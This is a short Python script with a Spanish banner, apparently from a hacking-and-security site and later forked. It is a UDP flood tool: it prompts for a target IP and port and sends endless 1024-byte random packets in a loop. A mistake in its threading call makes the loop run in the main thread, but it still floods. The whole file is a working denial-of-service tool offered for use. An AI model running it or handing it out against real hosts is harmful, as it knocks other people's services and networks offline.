import socket
import random
import threading

print ("##################################")
print ("# Envio paquetes UDP inundacion  #")
print ("# (c) hackingyseguridad.com 2017 #")
print ("# Ctrol+C para interrumpir envio #")
print ("##################################")
print ("###    Forked by Yariya 2020   ###")
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

ip=input('IP: ')
port=input('Port: ')


def attack():
    packet = random._urandom(1024)
    while 1:
        sock.sendto(packet, (ip, int(port)))

for x in range(1,1000):
    threading.Thread(target=attack()).start()
